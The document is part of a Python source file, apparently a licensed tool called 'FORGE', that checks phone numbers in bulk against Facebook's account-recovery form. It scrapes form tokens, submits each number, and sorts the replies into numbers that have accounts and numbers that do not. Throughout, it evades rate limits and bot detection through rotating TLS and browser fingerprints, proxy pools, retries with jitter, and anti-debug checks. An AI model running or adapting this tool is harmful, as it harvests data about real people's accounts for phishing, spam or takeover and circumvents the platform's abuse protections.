            reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
            try:
                auth_hdr = f"Proxy-Authorization: Basic {auth_b64}\r\n" if auth_b64 else ""
                connect_req = (
                    f"CONNECT m.facebook.com:443 HTTP/1.1\r\n"
                    f"Host: m.facebook.com:443\r\n"
                    f"Proxy-Connection: Keep-Alive\r\n"
                    f"{auth_hdr}\r\n"
                ).encode("ascii")
                writer.write(connect_req)
                await asyncio.wait_for(writer.drain(), timeout=timeout)
                status_line = await asyncio.wait_for(reader.readline(), timeout=timeout)
                ms = (time.perf_counter() - t0) * 1000.0
                if b" 200 " in status_line:
                    return raw_proxy, True, ms, f"Tunnel 200 OK ({ms:.0f}ms)"
                return raw_proxy, False, ms, "Bad Tunnel"
            finally:
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
        except Exception:
            ms = (time.perf_counter() - t0) * 1000.0
            return raw_proxy, False, ms, "Dead"

async def run_async_proxy_pool_check(raw_proxies: List[str], concurrency: int = 200) -> Tuple[List[str], int]:
    sem = asyncio.Semaphore(concurrency)
    total = len(raw_proxies)
    live_raw: List[str] = []
    dead_count = 0
    done_count = 0
    last_draw = 0.0

    tasks = [asyncio.create_task(async_check_single_proxy(p, sem)) for p in raw_proxies]
    for coro in asyncio.as_completed(tasks):
        if STOP_EVENT.is_set():
            break
        raw_p, is_live, _ms, detail = await coro
        done_count += 1
        label = raw_p.split("@")[-1][:18]
        if is_live:
            live_raw.append(raw_p)
            log("PROXY-LIVE", label, detail)
        else:
            dead_count += 1
            if total <= 200:
                log("PROXY-DIE", label, detail)
            else:
                now = time.perf_counter()
                if now - last_draw >= 0.15 or done_count == total:
                    last_draw = now
                    with print_lock:
                        sys.stdout.write(
                            f"{ANSI.CLEAR_LINE}{ANSI.CYAN}[PROXY-SCAN: {done_count}/{total}] "
                            f"{ANSI.GREEN}Live: {len(live_raw)}{ANSI.CYAN} | "
                            f"{ANSI.RED}Dead: {dead_count}{ANSI.RESET}"
                        )
                        sys.stdout.flush()

    if total > 200:
        with print_lock:
            sys.stdout.write(ANSI.CLEAR_LINE)
            sys.stdout.flush()

    return live_raw, dead_count

def safe_read_lines(path: Optional[Path]) -> Tuple[bool, List[str], str]:
    if path is None:
        return False, [], "No file specified."
    try:
        resolved = path.expanduser()
        if not resolved.exists():
            return False, [], f"File '{resolved}' does not exist."
        if resolved.is_dir():
            return False, [], f"'{resolved}' is a directory, not a file."
        raw_text = resolved.read_text(encoding="utf-8", errors="ignore")
    except PermissionError:
        return False, [], f"Permission denied reading '{path}'. In Termux run: termux-setup-storage"
    except OSError as exc:
        return False, [], f"Cannot read file ({exc.strerror or 'IO error'})."

    seen = set()
    out: List[str] = []
    for raw in raw_text.splitlines():
        s = re.sub(r"[\u200b-\u200d\ufeff]", "", raw).strip()
        if s and not s.startswith("#") and s not in seen:
            seen.add(s)
            out.append(s)

    if not out:
        return False, [], f"File '{path}' is empty."
    return True, out, "OK"

def verify_and_clean_proxies(proxy_file: Path, live_backup_file: Path) -> List[str]:
    ok, raw_proxies, _err = safe_read_lines(proxy_file)
    if not ok or not raw_proxies:
        return []

    log("PROXY-CHK", "START")
    try:
        live_raw, _dead_count = asyncio.run(run_async_proxy_pool_check(raw_proxies, concurrency=200))
    except Exception:
        live_raw = []

    if live_raw:
        clean_content = "\n".join(live_raw) + "\n"
        try:
            proxy_file.expanduser().write_text(clean_content, encoding="utf-8")
        except Exception:
            pass
        try:
            live_backup_file.expanduser().write_text(clean_content, encoding="utf-8")
        except Exception:
            pass
        log("PROXY-DONE", f"LIVE:{len(live_raw)}")
    else:
        log("PROXY-DONE", "LIVE:0")

    return [normalize_proxy(p) for p in live_raw]

def interactive_proxy_gate(proxy_file: Optional[Path], live_backup_file: Path) -> List[str]:
    curr_proxy = proxy_file
    while True:
        if curr_proxy is None:
            log("MODE", "DIRECT")
            return []

        ok, _lines, err_msg = safe_read_lines(curr_proxy)
        if not ok:
            with print_lock:
                sys.stdout.write(f"\n{ANSI.YELLOW}[!] Proxy file notice: {err_msg}{ANSI.RESET}\n")
                sys.stdout.flush()
        else:
            live_proxies = verify_and_clean_proxies(curr_proxy, live_backup_file)
            if live_proxies:
                return live_proxies
            with print_lock:
                sys.stdout.write(f"\n{ANSI.YELLOW}[!] 0 live proxies found in '{curr_proxy}'.{ANSI.RESET}\n")
                sys.stdout.flush()

        choice = _safe_input(f"{ANSI.YELLOW}[?] Run without proxy in DIRECT mode? (y/n, default y): {ANSI.RESET}").lower()
        if choice in ("", "y", "yes"):
            log("MODE", "DIRECT")
            return []

        new_path_str = _safe_input(
            f"{ANSI.CYAN}[*] Enter valid proxy file path (or press Enter to re-test '{curr_proxy}'): {ANSI.RESET}"
        ).strip('"').strip("'")
        if new_path_str:
            curr_proxy = Path(new_path_str).expanduser()

RE_FORM_BLOCK = re.compile(r'<form[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)
RE_HIDDEN_INPUT = re.compile(r'<input[^>]+type="hidden"[^>]*>', re.IGNORECASE)
RE_INPUT_NAME = re.compile(r'name="([^"]+)"')
RE_INPUT_VALUE = re.compile(r'value="([^"]*)"')
RE_JSDATR = re.compile(r'"_js_datr"\s*,\s*"([^"]+)"')

def format_phone_candidates(raw_number: str) -> str:
    clean = re.sub(r"[^\d+]", "", raw_number.strip())
    if clean.isdigit() and len(clean) >= 11 and not clean.startswith("0"):
        return f"+{clean}"
    return clean

def extract_tokens_and_action(html: str, host: str) -> Tuple[Optional[str], str, str, Dict[str, str], Optional[str]]:
    lsd = None
    jazoest = "2950"
    extra_fields: Dict[str, str] = {}

    m_datr = RE_JSDATR.search(html)
    jsdatr = m_datr.group(1) if m_datr else None

    target_form_html = html
    for fm in RE_FORM_BLOCK.finditer(html):
        block = fm.group(0)
        if 'name="email"' in block or "login/identify" in block or "identify_yourself_flow" in block:
            target_form_html = block
            break

    for inp in RE_HIDDEN_INPUT.finditer(target_form_html):
        tag = inp.group(0)
        name_m = RE_INPUT_NAME.search(tag)
        val_m = RE_INPUT_VALUE.search(tag)
        if name_m and val_m:
            k, v = name_m.group(1), html_lib.unescape(val_m.group(1))
            extra_fields[k] = v
            if k == "lsd":
                lsd = v
            elif k == "jazoest":
                jazoest = v

    if not lsd:
        for pat in (
            r'name="lsd"\s+value="([^"]+)"',
            r'value="([^"]+)"\s+name="lsd"',
            r'"LSD"\s*,\s*\[\]\s*,\s*\{\s*"token"\s*:\s*"([^"]+)"',
            r'"lsd"\s*:\s*"([^"]+)"',
        ):
            m = re.search(pat, html)
            if m:
                lsd = m.group(1)
                break

    if jazoest == "2950":
        for pat in (
            r'name="jazoest"\s+value="([^"]+)"',
            r'"jazoest"\s*:\s*"([^"]+)"',
            r'jazoest=(\d+)',
        ):
            m = re.search(pat, html)
            if m:
                jazoest = m.group(1)
                break

    action_url = f"https://{host}/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&alternate_search=0&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0"
    for act_pat in (
        r'<form[^>]+id="identify_yourself_flow"[^>]+action="([^"]+)"',
        r'<form[^>]+action="([^"]*login/identify[^"]*)"',
        r'<form[^>]+action="([^"]+)"',
    ):
        act_m = re.search(act_pat, target_form_html, re.IGNORECASE)
        if act_m:
            raw_act = html_lib.unescape(act_m.group(1))
            if "login/identify" in raw_act or "recover" in raw_act:
                if raw_act.startswith("/"):
                    action_url = f"https://{host}{raw_act}"
                elif raw_act.startswith("http"):
                    action_url = raw_act
                break

    return lsd, jazoest, action_url, extra_fields, jsdatr

def classify_recovery_response(
    status_code: int,
    location_hdr: str,
    final_url: str,
    body: str,
    cookies: Dict[str, str],
) -> Tuple[str, str]:
    if status_code == 404:
        return State.ERROR, "HTTP 404"
    if status_code == 429:
        return State.RATE_LIMIT, "HTTP 429"

    if location_hdr:
        low_loc = location_hdr.lower()
        for hit_m in (
            "recover/initiate",
            "login/account_recovery",
            "recover/code",
            "conf_recover",
            "account_search",
            "lara_product",
            "ldata=",
            "cuid=",
        ):
            if hit_m in low_loc:
                return State.HAVE, "Matched 302"

    clean_body = body[9:].strip() if body.startswith("for (;;);") else body
    lower_body = clean_body.lower()
    lower_url = final_url.lower()

    for marker in (
        "you’re temporarily blocked",
        "you're temporarily blocked",
        "you are temporarily blocked",
        "try again later",
        "too many attempts",
        "wait a few minutes before you try again",
        "misusing this feature",
        "it looks like you were misusing",
    ):
        if marker in lower_body:
            return State.RATE_LIMIT, "Rate limit"

    for marker in (
        "no search results",
        "your search did not return any results",
        "didn't match any account",
        "did not match any account",
        "we couldn't find your account",
        "couldn&#039;t find your account",
        "login_identify_search_error_msg",
        "please try again with other information",
        "search did not return any results",
        "no account found",
        "enter a valid email or mobile number",
        "No account found. Check your mobile number or email address and try again.",
    ):
        if marker in lower_body:
            return State.NOT_HAVE, "No account"

    for marker in (
        "recover/initiate",
        "login/account_recovery",
        "recover/code",
        "conf_recover",
        "account_search",
        "lara_product",
        "ldata=",
        "?cuid=",
        "&cuid=",
    ):
        if marker in lower_url:
            return State.HAVE, "Matched URL"

    for marker in (
        "send code via sms",
        "send code via whatsapp",
        "send code via email",
        "how do you want to receive the code",
        "reset your password",
        "these accounts matched your search",
        "select your account",
        "we can send a login code",
        "enter password to log in",
        "choose a way to log in",
        "recover/initiate",
        '"cuid":',
        "contact_point_selector",
        "try another way",
    ):
        if marker in lower_body:
            return State.HAVE, "Matched DOM"

    if ("search_attempts=1" in lower_url or "ctx=recover" in lower_url) and (
        'id="identify_yourself_flow"' in lower_body or 'name="email"' in lower_body
    ):
        return State.NOT_HAVE, "Returned form"

    return State.ERROR, "Ambiguous"

class FingerprintedClient:
    def __init__(self, proxy: Optional[str], timeout: int) -> None:
        self.proxy = proxy
        self.timeout = timeout
        self.profile: BrowserProfile = random.choice(BROWSER_PROFILES)
        self.session: Optional[requests.Session] = None
        self.lsd: Optional[str] = None
        self.jazoest: str = "2950"
        self.action_url: str = ""
        self.extra_fields: Dict[str, str] = {}
        self.uses: int = 0
        self._rotate_fingerprint()

    def _rotate_fingerprint(self) -> None:
        if self.session:
            try:
                self.session.close()
            except Exception:
                pass
        self.profile = random.choice(BROWSER_PROFILES)
        self.session = requests.Session()
        self.session.max_redirects = 5
        self.session.mount("https://", TLSFingerprintAdapter(self.profile.ciphers))
        if self.proxy:
            self.session.proxies = {"http": self.proxy, "https": self.proxy}

        headers = {
            "User-Agent": self.profile.user_agent,
            "Accept": self.profile.accept,
            "Accept-Language": self.profile.accept_language,
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        self.session.headers.update(headers)
        self.lsd = None
        self.uses = 0

    def _bounded_get(self, url: str, max_hops: int = 4) -> requests.Response:
        assert self.session is not None
        curr = url
        resp = self.session.get(curr, timeout=self.timeout, allow_redirects=False)
        for _ in range(max_hops):
            if resp.status_code not in (301, 302, 303, 307, 308):
                break
            loc = resp.headers.get("Location", "")
            if not loc:
                break
            curr = urljoin(curr, loc)
            resp = self.session.get(curr, timeout=self.timeout, allow_redirects=False)
        return resp

    def ensure_warm_token(self, number: str) -> Tuple[bool, str]:
        if self.session and self.lsd and self.uses < 15:
            return True, "Warm"

        self._rotate_fingerprint()
        assert self.session is not None

        host = "m.facebook.com"
        init_url = f"https://{host}/login/identify/?ctx=recover"
        log("GET-TOKEN", number)
        resp = self._bounded_get(init_url, max_hops=4)

        if resp.status_code != 200:
            log("WARN-GET", number)
            return False, f"HTTP {resp.status_code}"

        lsd, jazoest, action_url, extra, jsdatr = extract_tokens_and_action(resp.text, host)
        if jsdatr:
            self.session.cookies.set("_js_datr", jsdatr, domain=".facebook.com")
            if "datr" not in self.session.cookies:
                self.session.cookies.set("datr", jsdatr, domain=".facebook.com")

        if lsd:
            self.lsd = lsd
            self.jazoest = jazoest
            self.action_url = action_url
            self.extra_fields = extra
            self.uses = 0
            log("TOKEN-OK", number)
            return True, "OK"

        return False, "No LSD"

    def check_number(self, number: str) -> Tuple[str, str]:
        try:
            ok, msg = self.ensure_warm_token(number)
            if not ok:
                self.lsd = None
                return State.RATE_LIMIT, msg

            assert self.session is not None and self.lsd is not None
            self.uses += 1

            for k in ("sfiu", "cuid"):
                if k in self.session.cookies:
                    del self.session.cookies[k]

            query_email = format_phone_candidates(number)
            payload = dict(self.extra_fields)
            payload.update({
                "lsd": self.lsd,
                "jazoest": self.jazoest,
                "email": query_email,
                "did_submit": "Search",
            })

            post_headers = {
                "Origin": "https://m.facebook.com",
                "Referer": "https://m.facebook.com/login/identify/?ctx=recover",
                "Content-Type": "application/x-www-form-urlencoded",
            }

            log("POST-FORM", number)

            resp = self.session.post(
                self.action_url,
                data=payload,
                headers=post_headers,
                timeout=self.timeout,
                allow_redirects=False,
            )
            loc_hdr = resp.headers.get("Location", "")
            hops = 0

            curr_url = str(resp.url)
            while resp.status_code in (301, 302, 303, 307, 308) and hops < 2:
                low_l = loc_hdr.lower()
                if any(h in low_l for h in ("recover/initiate", "login/account_recovery", "recover/code", "conf_recover", "ldata=", "cuid=")):
                    break
                if not loc_hdr:
                    break
                hops += 1
                next_u = urljoin(curr_url, loc_hdr)
                curr_url = next_u
                resp = self.session.get(next_u, timeout=self.timeout, allow_redirects=False)
                loc_hdr = resp.headers.get("Location", "")

            cookies_dict = self.session.cookies.get_dict()
            log("HTTP-RESP", number)

            state, detail = classify_recovery_response(
                resp.status_code,
                loc_hdr,
                str(resp.url),
                resp.text,
                cookies_dict,
            )
            if state in (State.RATE_LIMIT, State.ERROR):
                self.lsd = None
            return state, detail

        except Exception:
            self.lsd = None
            return State.ERROR, "RequestFailed"

thread_local = threading.local()

def get_client(live_proxies: List[str], idx: int, timeout: int) -> FingerprintedClient:
    proxy = live_proxies[idx % len(live_proxies)] if live_proxies else None
    client: Optional[FingerprintedClient] = getattr(thread_local, "client", None)
    if client is None or client.proxy != proxy:
        client = FingerprintedClient(proxy=proxy, timeout=timeout)
        thread_local.client = client
    return client

def process_number(
    idx: int,
    total: int,
    number: str,
    live_proxies: List[str],
    retries: int,
    delay: float,
    timeout: int,
    f_have,
    f_not_have,
    have_name: str,
    not_have_name: str,
) -> str:
    global CHECKED_NUMBERS, FOUND_NUMBERS

    if STOP_EVENT.is_set():
        return State.ERROR

    if idx % 25 == 0:
        _anti_debug_and_tamper_check()

    final_state = State.ERROR

    for attempt in range(1, retries + 2):
        if STOP_EVENT.is_set():
            return State.ERROR

        client = get_client(live_proxies, idx + attempt, timeout)
        if attempt > 1:
            client._rotate_fingerprint()

        log("CHECK", number)

        state, _detail = client.check_number(number)
        final_state = state

        if state in (State.HAVE, State.NOT_HAVE):
            break

        jitter = random.uniform(0.6, 1.2) + delay
        log("BACKOFF", number)
        if STOP_EVENT.wait(timeout=jitter):
            return State.ERROR

    if STOP_EVENT.is_set():
        return State.ERROR

    with stats_lock:
        CHECKED_NUMBERS += 1
        if final_state == State.HAVE:
            FOUND_NUMBERS += 1

    if final_state == State.HAVE:
        with file_lock:
            try:
                f_have.write(f"{number}\n")
                f_have.flush()
            except Exception:
                pass
        log("HIT-HAVE", number, have_name=have_name)
    elif final_state == State.NOT_HAVE:
        with file_lock:
            try:
                f_not_have.write(f"{number}\n")
                f_not_have.flush()
            except Exception:
                pass
        log("MISS-NONE", number)
    else:
        log("SKIP-FAIL", number)

    if delay > 0 and not STOP_EVENT.is_set():
        STOP_EVENT.wait(timeout=delay)

    return final_state

def prompt_paths_interactively(
    default_input: Optional[Path],
    default_proxies: Optional[Path],
) -> Tuple[List[str], Optional[Path]]:
    cand_in = default_input
    numbers: List[str] = []
    while True:
        if cand_in is not None:
            ok, loaded, err_msg = safe_read_lines(cand_in)
            if ok:
                numbers = loaded
                break
            with print_lock:
                sys.stdout.write(f"{ANSI.RED}[!] Input error: {err_msg}{ANSI.RESET}\n")
                sys.stdout.flush()

        raw_in = _safe_input(
            f"{ANSI.BOLD}{ANSI.CYAN}[?] input numbers file path : {ANSI.RESET}"
        ).strip('"').strip("'")
        cand_in = Path(raw_in).expanduser() if raw_in else Path("numbers.txt")

    px_path: Optional[Path] = default_proxies
    if px_path is None:
        raw_px = _safe_input(
            f"{ANSI.BOLD}{ANSI.CYAN}[?] input proxy file path (press enter if none): {ANSI.RESET}"
        ).strip('"').strip("'")
        if raw_px and raw_px.lower() not in ("none", "no", "direct", "n"):
            px_path = Path(raw_px).expanduser()
        else:
            px_path = None
    else:
        px_path = px_path.expanduser()

    return numbers, px_path

def _open_output_safe(path: Path, fallback_name: str):
    try:
        p = path.expanduser()
        p.parent.mkdir(parents=True, exist_ok=True)
        return p.open("a", encoding="utf-8", buffering=1), str(p)
    except Exception:
        fb = Path.home() / fallback_name
        return fb.open("a", encoding="utf-8", buffering=1), str(fb)

def main() -> None:
    global PINNED_FACEBOOK_IP, TOTAL_NUMBERS

    parser = argparse.ArgumentParser(
        description="FORGE - High-Speed SSR m.facebook.com Recovery Bulk Number Filter",
        add_help=True,
    )
    parser.add_argument("-i", "--input", type=Path, default=None, help="Input numbers file")
    parser.add_argument("-p", "--proxies", type=Path, default=None, help="Optional proxies file")
    parser.add_argument("-k", "--key", type=str, default=None, help="Access Key")
    parser.add_argument("--live-proxies", type=Path, default=Path("live_proxies.txt"), help="Verified live proxies output")
    parser.add_argument("--have", type=Path, default=Path("/sdcard/have.txt"), help="Output file for HIT numbers")
    parser.add_argument("--not-have", type=Path, default=Path("/sdcard/not_have.txt"), help="Output file for MISS numbers")
    parser.add_argument("-w", "--workers", type=int, default=6, help="Worker threads (default: 6)")
    parser.add_argument("-d", "--delay", type=float, default=0.15, help="Base delay in seconds (default: 0.15)")
    parser.add_argument("-t", "--timeout", type=int, default=8, help="HTTP timeout in seconds (default: 8)")
    parser.add_argument("-r", "--retries", type=int, default=2, help="Retries per number (default: 2)")

    try:
        args = parser.parse_args()
    except SystemExit:
        return

    workers = max(1, min(int(args.workers), 32))
    delay = max(0.0, float(args.delay))
    timeout = max(3, int(args.timeout))
    retries = max(0, int(args.retries))

    # 1. Verify license; on success, clears screen and prints Logo + License Expired At under logo.
    authorize_session(args.key)

    # 2. Prompt and validate input numbers and optional proxy file
    numbers, proxy_file = prompt_paths_interactively(args.input, args.proxies)

    PINNED_FACEBOOK_IP = ""
    live_proxies = interactive_proxy_gate(proxy_file, args.live_proxies)

    if not live_proxies:
        PINNED_FACEBOOK_IP = discover_working_facebook_ip()

    TOTAL_NUMBERS = len(numbers)
    log("ENGINE-GO", f"TOTAL:{TOTAL_NUMBERS}")

    stats = {State.HAVE: 0, State.NOT_HAVE: 0, State.RATE_LIMIT: 0, State.ERROR: 0}

    f_have, have_label = _open_output_safe(args.have, "have.txt")
    f_not_have, not_have_label = _open_output_safe(args.not_have, "not_have.txt")
    OPEN_FILE_HANDLES.extend([f_have, f_not_have])

    executor = ThreadPoolExecutor(max_workers=workers)
    try:
        futures = [
            executor.submit(
                process_number,
                idx,
                TOTAL_NUMBERS,
                num,
                live_proxies,
                retries,
                delay,
                timeout,
                f_have,
                f_not_have,
                have_label,
                not_have_label,
            )
            for idx, num in enumerate(numbers, start=1)
        ]
        pending = set(futures)
        while pending and not STOP_EVENT.is_set():
            done = {f for f in pending if f.done()}
            for fut in done:
                pending.remove(fut)
                try:
                    res = fut.result()
                    stats[res] = stats.get(res, 0) + 1
                except Exception:
                    stats[State.ERROR] += 1
            if pending:
                time.sleep(0.1)
    except KeyboardInterrupt:
        _install_kill_switch()
        os._exit(130)
    finally:
        executor.shutdown(wait=False, cancel_futures=True)
        for fh in (f_have, f_not_have):
            try:
                fh.flush()
                fh.close()
            except Exception:
                pass

    with print_lock:
        sys.stdout.write("\n")
        sys.stdout.flush()
    time.sleep(0.1)
    print(f"\n\n=======================================")
    print(f"{ANSI.BOLD}{ANSI.GREEN}TOTAL NUMBERS CHECKED: {CHECKED_NUMBERS}")
    print(f"{ANSI.BOLD}{ANSI.GREEN}TOTAL NUMBERS FOUND: {FOUND_NUMBERS}")
    print(f"{ANSI.BOLD}{ANSI.RED}TOTAL NUMBERS NOT FOUND:{stats[State.NOT_HAVE]}")
    print(f"{ANSI.BOLD}{ANSI.YELLOW}TOTAL NUMBERS RATE-LIMIT:{stats[State.RATE_LIMIT]}")
    print(f"{ANSI.BOLD}{ANSI.GREEN}FILE SAVED: {ANSI.BLUE}have.txt, not_have.txt{ANSI.RESET}")
    print(f"=======================================\n")

if globals().get("__name__", "__main__") == "__main__":
    main()